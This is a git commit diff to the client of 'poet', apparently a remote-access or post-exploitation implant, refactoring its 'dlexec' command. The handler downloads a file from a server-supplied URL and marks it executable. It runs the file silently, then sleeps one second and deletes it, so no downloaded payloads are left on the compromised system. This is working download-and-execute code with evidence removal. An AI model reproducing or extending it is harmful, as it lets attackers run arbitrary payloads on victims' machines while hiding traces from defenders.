209c798514885e8df4773910642082caf1ce2212
Mark Mossberg <mark.mossberg@gmail.com>
2015-06-26 18:30:47 -0400

    Refactor dlexec to sleep after Popening
    sleep after calling Popen as a practical solution to the race condition
    problem I was experiencing where the file would get deleted in between
    the child fork/exec. now poet will automatically delete dlexec'd files
    instead of leaving them on the system.

--- src/client.py
+++ src/client.py
@@ -130,11 +130,31 @@ class PoetClient(object):
         r = urllib2.urlopen(inp.split()[1])
         with tempfile.NamedTemporaryFile(delete=False) as f:
             f.write(r.read())
+            f.flush()
             os.fchmod(f.fileno(), stat.S_IRWXU)
+
         # intentionally not using sp.call() here because we don't
         # necessarily want to wait() on the process. also, this is outside
         # the with block to avoid a `Text file busy' error (linux)
         sp.Popen(f.name, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
+
+        # we need this sleep(1) because of a race condition between the
+        # Popen and following remove. If there were no sleep, in the Popen,
+        # between the time it takes for the parent to fork, and the child's
+        # exec syscall to load the file into memory, the parent would return
+        # back here and delete the file before it gets executed. by sleeping
+        # 1 second, we give the child a reasonable amount of time to hit the
+        # exec syscall.
+        #
+        # NOTE: this is not a 100% solution. if for some reason, the time
+        # between the child fork/exec is longer than 1 second (lol) the file
+        # will still be deleted before it's executed. a "safer" solution would
+        # be to keep track of all the paths of files downloaded and add a
+        # shell "cleanup" command which could be run regularly to remove all
+        # those paths after you know they're executed
+        time.sleep(1)
+
+        os.remove(f.name)
 
     def chint(self, s, inp):
         """Handle server `chint' command.
